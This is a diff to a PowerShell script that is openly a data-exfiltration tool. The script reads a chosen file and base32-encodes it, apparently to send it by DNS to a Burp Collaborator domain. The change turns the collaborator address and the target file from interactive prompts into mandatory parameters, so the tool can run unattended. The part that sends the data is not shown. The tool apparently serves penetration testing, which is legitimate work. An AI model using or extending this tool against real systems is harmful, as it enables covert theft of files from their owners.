@@ -1,5 +1,12 @@
 [CmdletBinding()]
-param()
+param(
+    [parameter(
+        Mandatory = $true, HelpMessage="Burp Collaborator address")]
+    $collabDomain,
+	[parameter(
+        Mandatory = $true, HelpMessage="File to exfiltrate")]
+    $exfilFile
+)
 $characterSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
 $dnsFlag="nspi";
 $amountFlag="amount";
@@ -21,9 +28,7 @@ Function Encode-Base32($data) {
   return $encodedData
 }
 
-#Read in the collaborator address and the data to exfil
-$collabDomain = Read-Host -Prompt 'Burp Collaborator address'
-$exfilFile = Read-Host -Prompt 'File to exfiltrate'
+#Read the contents of the file to exfiltrate
 $exfilData = Get-Content $exfilFile | Out-String
 
 #Convert data to base32
